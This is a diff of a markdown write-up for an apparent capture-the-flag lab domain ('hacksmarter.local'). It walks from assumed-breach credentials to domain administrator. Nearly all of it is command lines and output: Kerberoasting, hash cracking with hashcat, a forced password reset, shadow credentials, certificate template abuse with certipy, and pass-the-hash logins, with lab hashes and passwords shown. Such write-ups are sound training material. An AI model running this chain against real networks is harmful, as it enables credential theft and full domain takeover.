@@ -1,8 +1,9 @@
 ## Assumed breach creds
-hacksmarter.local\faraday:hacksmarter123
+`hacksmarter.local\faraday:hacksmarter123`
                                                                                                                                   
 
 ## Used nxc to get kerberoastable users
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ nxc ldap 10.1.178.204 -u faraday -p hacksmarter123 --kerberoasting kerberoasting.txt
 LDAP        10.1.178.204    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
@@ -11,9 +12,11 @@ LDAP        10.1.178.204    389    DC01             [*] Skipping disabled accoun
 LDAP        10.1.178.204    389    DC01             [*] Total of records returned 1
 LDAP        10.1.178.204    389    DC01             [*] sAMAccountName: alt.svc, memberOf: [], pwdLastSet: 2025-09-21 23:07:42.894050, lastLogon: <never>
 LDAP        10.1.178.204    389    DC01             $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local\alt.svc*$aa012774099540370083a965991ee110$0d39744a67590379e8316be1163e20abc8ce5f4095a01f02714eb1bad08a9ccd6b98ff1ffb9d2bd0d0477a9df9870fb81d7064ae61a5d380323a376b5925b2e131a248d8737870c97fc256187de6e2aa8420014dcb94bdc2f1185b73249a57fe34161d7a41b9d49184fbb9a6765261abab5e8aff93312bca8143d92580281117dfb6b4c12d96843311203f31f671610f836cc06ad79da762a9444287473714b24de234315329f6c6d6c861461b03a1d0129695a06bd3480aa1941e421fc6fbad575d2f63e5e895e78361b8c5bc494b7e652549e4a9bf6471a137f8ac288744762ec804174ce6fdc9331a786b790d29ceb7e4ce59574cdda9770240653c46593622817ca5b3eecbbc5720a5cf8cdaa7a79c6d77d09627c7f6d50bc98738a3064724164650d0faba264421f76841f513599673e08c1cc3825dc12148bfd53b4cf801e51e7c0d89f0f383ac4c5ab1b5764c2fce0e38b332ac821dc20a48df2cc9117400de87f51a9c04c362d81e64ef8d795ea762199868194b0d7f3f9fe49f1dabe94ba9b63778e459a341634d57ade33cbccee45c2947f25eb448721982d2cbfb515def707dfee23cdcd3a3f7da2f6372e9dba15a9626e52d0750a1f1965ae56808398257fa368d1d306c15eae88ca6f008af1326b24f9deb4b080cf2b04be4903184d4ff69b2da56b4ce4c832a9be5b5d799081c807f4656213eabcaf3600034afe7f42244bcb888cdba68969a9c0a2bac8193e7dbf26b72ddec9f4e52044f3a28c4c4e74c5aff1b0406040b1f2287b751f18a2de5ceedcd6d7c3e761119ca0f8a12e06eb2a3b4816c638a04f6187008babe62e0e86be6d95e8ebcec7abd824460f22457e768c38de48cf1ad810d18302c610b6c40185767d2b35020186cd942767f159e134dc22ec8d0420b2885811f2d08910cf38145cbc93eaeca1df746e192ee16c98d5537e7713fa1c599ba6400a0b0c26fa9ee07a6a3eb531f8d1655004a651497815ea25afed689b433ec98fc865c395e42532d5245755b137485636fe89514441e0f5b18a3e6eb585839f6cb318be834db91328ab8ed40ee6d261bab02dc98f0cf38cbafc0eabc84520f11b4afaf12412313a56776e143aff2257c55cfba7ec7d5619a6e653a64bc202a24a614f7960467afffc469f7da0c0199bb5ac525d94edf8c57551f423d836ab5f5d0b2bbff6f357ee1e4f992bbe2d96ac5dcbe667ed1e91cec8ae81bcc8284a7934827e0fb4c960c2b6282d3ad270a89b805fa166c64d7bd4903d021142bba1fb8e7a7ba3f006a5efa506623989db3387ee2ffcb507c06d05e2e60cac5cb9f98febdb523131119955c4e3c92546469dcf24658f663fdd8349674a5035eec7729695207e15cb7ad72278c911fd9d05e4a04becf7a6e5d31cf7843e29b3cd2f03e66073bd46e999d95eddaa1867382a795b643edaa8d1fe562222d8a28542a2f555cd7f51eaf1e888551a40d4f23c799c7f4ac253969df16ca603ed7cdf19d8d7bc609d2573108ce31e60d06
+```
 
 
 ## Hashcat cracking alt.svc hashes
+```
 % hashcat -a 0 -m 13100  kerberoasting.txt kaonashi14M.txt
 hashcat (v7.1.2) starting
 
@@ -80,21 +83,27 @@ Hardware.Mon.#02.: Util: 32% Pwr:152mW
 
 Started: Sat Oct  4 13:36:33 2025
 Stopped: Sat Oct  4 13:36:41 2025
+```
 
 
 ## The creds work for alt.svc
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ nxc smb hacksmarter.local -u alt.svc -p babygirl1
 SMB         10.1.178.204    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)
 SMB         10.1.178.204    445    DC01             [+] hacksmarter.local\alt.svc:babygirl1 
+```
 
 
 ## alt.svc has GenericAll privileges on yorinobu                                                                                                 
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ net rpc password "yorinobu" "Password123" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S "10.1.178.204"
+```
 
 
 ## Winrm possible with yorinobu account
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ evil-winrm -i 10.1.178.204 -u yorinobu -p Password123
                                         
@@ -106,9 +115,11 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Yorinobu\Documents> 
+```
 
 
 ## Get password-protected cert(pfx) of soulkiller.svc as yorinobu has GenericWrite on soulkiller.svc account
+```
 ┌──(pywhisker)─(kali㉿kali)-[~/hacksmarter/arasaka/pywhisker]
 └─$ ./pywhisker.py -d "hacksmarter.local" -u yorinobu --target soulkiller.svc -p Password123  --action "add" -f soulkiller
 [*] Searching for the target account
@@ -125,9 +136,11 @@ Info: Establishing connection to remote endpoint
 [+] Saved PFX (#PKCS12) certificate & key at path: soulkiller.pfx
 [*] Must be used with password: 2D2bnavVhzh5wkw3CY1D
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
 
 
 ## Request TGT and get hash
+```
 ┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
 └─$ python3 gettgtpkinit.py -cert-pfx ./soulkiller.pfx -pfx-pass 2D2bnavVhzh5wkw3CY1D hacksmarter.local/soulkiller.svc soulkiller.svc.ccache         
 2025-10-04 22:45:52,797 minikerberos INFO     Loading certificate and key from file
@@ -149,9 +162,12 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting ticket to self with PAC
 Recovered NT Hash
 f4ab68f27303bcb4024650d8fc5f973a
+```
+
 
 ## Crack nt hash with hashcat
- % hashcat -m 1000 ./nt.txt ./rockyou.txt                                            
+```
+% hashcat -m 1000 ./nt.txt ./rockyou.txt                                            
 hashcat (v7.1.2) starting
 
 METAL API (Metal 370.63.1)
@@ -220,16 +236,20 @@ Started: Sat Oct  4 22:55:49 2025
 Stopped: Sat Oct  4 22:55:51 2025
 % hashcat -m 1000 ./nt.txt ./rockyou.txt --show
 f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
+```
 
 
 ## Creds confirmed working
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ nxc smb 10.1.178.204 -u soulkiller.svc -p 'MYpassword123#'
 SMB         10.1.178.204    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) 
 SMB         10.1.178.204    445    DC01             [+] hacksmarter.local\soulkiller.svc:MYpassword123# 
+```
 
 
 ## Look at a list of misconfigured cert templates
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ certipy find -u 'soulkiller.svc' -p 'MYpassword123#' -dc-ip 10.1.178.204 -enabled -hide-admins      
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -253,9 +273,11 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote text output to '20251005010447_Certipy.txt'
 [*] Saving JSON output to '20251005010447_Certipy.json'
 [*] Wrote JSON output to '20251005010447_Certipy.json'
+```
 
 
 ## One particular misconfigured template stands out
+```
 Template Name                       : AI_Takeover
 Display Name                        : AI_Takeover
 Certificate Authorities             : hacksmarter-DC01-CA
@@ -298,9 +320,11 @@ Members
 -------------------------------------------------------------------------------
 Administrator            the_emperor
 The command completed successfully.
+```
 
 
 ## Get administrator SID
+```
 ┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
 └─$ certipy account -u soulkiller.svc -p 'MYpassword123#' -dc-ip 10.1.178.204 -user administrator read
 
@@ -333,9 +357,11 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-500'
 [*] Saving certificate and private key to 'administrator_dc01.pfx'
 [*] Wrote certificate and private key to 'administrator_dc01.pfx'
+```
 
 
 ## Get administrator NTLM hashes
+```
 ┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
 └─$ certipy auth -pfx ./administrator_dc01.pfx -dc-ip 10.1.178.204 -password TempPass123 
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -357,9 +383,11 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec
+```
 
 
 ## Logged in as administrator
+```
 ┌──(kali㉿kali)-[~/hacksmarter/arasaka]
 └─$ evil-winrm -i 10.1.178.204  -u administrator -H '4366ec0f86e29be2a4a5e87a1ba922ec'
                                         
@@ -398,3 +426,4 @@ Mode                 LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> gc .\root.txt
 fcf1dd0f08d1068a2f151fd2ec5ecf05
+```
